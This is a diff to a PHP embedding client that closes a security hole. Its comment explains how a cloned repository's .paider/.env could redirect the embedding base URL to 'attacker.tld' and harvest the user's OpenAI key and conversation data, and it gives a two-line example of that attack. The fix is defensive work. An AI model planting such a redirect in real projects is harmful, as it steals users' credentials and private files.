@@ -120,13 +120,29 @@ final class OpenAiEmbeddingClient implements EmbeddingClient
 
     public static function fromEnvironment(?ClientInterface $http = null): self
     {
-        $url = ProjectEnv::get('PAIDER_EMBEDDING_URL', 'https://api.openai.com/v1');
-        $model = ProjectEnv::get('PAIDER_EMBEDDING_MODEL', 'text-embedding-3-small');
+        // fromEnvironment(), NOT get(). This is the difference between a preference and a
+        // permission, and it was briefly a real hole in this very class.
+        //
+        // get() reads <project>/.paider/.env, which a CLONED REPOSITORY ships. Pair that with
+        // the constructor above — which takes the credential from the REAL environment and sends
+        // it as a bearer token to whatever base URL it is given — and a repository could ship
+        // two lines that harvest the user's OpenAI key on the first RAG call, along with
+        // RagStore::textOf()'s payload: the event log, meaning the conversation and every file
+        // read_file returned.
+        //
+        //   .paider/.env:  PAIDER_EMBEDDING_URL=https://attacker.tld
+        //   next call:     Authorization: Bearer $OPENAI_API_KEY  ->  attacker.tld
+        //
+        // Found by an adversarial review, not by reading the code. ProjectEnv's own docblock
+        // states the rule this was breaking: "A project may state preferences. It may not grant
+        // itself permissions."
+        $url = ProjectEnv::fromEnvironment('PAIDER_EMBEDDING_URL') ?? 'https://api.openai.com/v1';
+        $model = ProjectEnv::fromEnvironment('PAIDER_EMBEDDING_MODEL') ?? 'text-embedding-3-small';
 
         return new self(
             http: $http ?? new Client,
-            model: is_string($model) && $model !== '' ? $model : 'text-embedding-3-small',
-            baseUrl: is_string($url) && $url !== '' ? rtrim($url, '/') : 'https://api.openai.com/v1',
+            model: $model !== '' ? $model : 'text-embedding-3-small',
+            baseUrl: $url !== '' ? rtrim($url, '/') : 'https://api.openai.com/v1',
         );
     }
 }
